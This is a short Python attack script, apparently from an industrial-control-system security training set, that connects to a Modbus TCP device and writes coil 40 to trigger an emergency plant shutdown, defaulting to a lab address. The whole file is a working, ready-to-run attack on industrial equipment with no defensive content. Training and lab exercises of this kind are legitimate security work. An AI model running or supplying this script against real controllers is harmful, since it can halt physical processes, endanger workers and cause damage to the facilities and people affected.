#!/usr/bin/env python3
"""
Attack 4 — Plant Shutdown via Coil 40
MITRE: T1855 — Remote System Process Manipulation (ICS)
Triggers emergency shutdown interlock — coil 40 = plant stop
Adapted from rudrasecure/otsoctraining
"""

import sys
from pymodbus.client import ModbusTcpClient

def run_attack(host, port=502):
    client = ModbusTcpClient(host, port=int(port))
    if not client.connect():
        print(f"[!] Failed to connect to {host}:{port}")
        sys.exit(1)

    print(f"[*] Connected to {host}:{port}")
    result = client.write_coil(40, 1)
    if hasattr(result, 'isError') and result.isError():
        print(f"[!] Coil write failed: {result}")
    else:
        print("[+] Coil 40 = 1 — plant shutdown triggered")

    client.close()

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "10.10.50.20"
    port = sys.argv[2] if len(sys.argv) > 2 else 502
    run_attack(host, port)
